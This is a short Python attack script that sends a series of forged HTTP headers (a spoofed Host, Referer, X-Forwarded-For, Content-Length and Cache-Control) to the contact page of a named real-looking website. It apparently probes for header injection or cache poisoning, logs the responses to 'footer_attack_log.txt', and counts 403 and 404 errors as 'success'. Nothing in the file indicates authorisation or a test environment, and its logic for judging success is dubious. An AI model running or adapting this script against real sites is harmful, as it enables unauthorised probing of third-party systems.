import requests

# Target the contactus section of the website
footer_url = "https://www.mentorsacco.co.ke/contactus"  # Updated target URL

# List of payloads targeting footer-related vulnerabilities or headers
payloads = [
    {"User-Agent": "malicious-footer-agent"},  # Changing the user agent to something abnormal
    {"X-Forwarded-For": "malicious-footer"},   # Manipulating the forwarded-for header (might influence caching)
    {"Referer": "http://malicious.site"},      # Malicious referrer to influence the cache or site behavior
    {"Cache-Control": "no-cache, no-store"},   # Forcing a cache miss or potential poisoning
    {"Content-Length": "10000"},               # Injecting a large content length, potentially breaking footer handling
    {"Host": "malicious-site.com"}             # Changing the Host header to simulate a malicious server
]

# Function to send requests with payloads to the contactus URL
def send_payload(footer_url, payload):
    headers = payload
    try:
        # Send request with injected headers
        response = requests.get(footer_url, headers=headers)
        return response
    except requests.exceptions.RequestException as e:
        return f"Error: {str(e)}"

# Function to log results
def log_results(payload, response):
    with open("footer_attack_log.txt", "a") as log_file:
        log_file.write(f"Payload Sent: {payload}\n")
        log_file.write(f"Response Code: {response.status_code}\n")
        log_file.write(f"Response Text: {response.text[:200]}\n")  # Log a portion of the response
        log_file.write("-" * 50 + "\n")

# Main function to execute payload injections and print results
def run_attack():
    print("[+] Starting attack on contactus section...")

    for payload in payloads:
        response = send_payload(footer_url, payload)
        
        # Check response status and log success/failure
        if isinstance(response, str):
            print(f"[!] Error: {response}")
        else:
            if response.status_code == 403:
                print(f"[+] Success: Footer injection resulted in 403 Forbidden.")
            elif response.status_code == 404:
                print(f"[+] Success: Footer injection resulted in 404 Not Found.")
            else:
                print(f"[-] No major change: Response Code {response.status_code}")

            log_results(payload, response)

    print("[+] Attack completed. Check the log file for detailed results.")

# Run the attack
if __name__ == "__main__":
    run_attack()
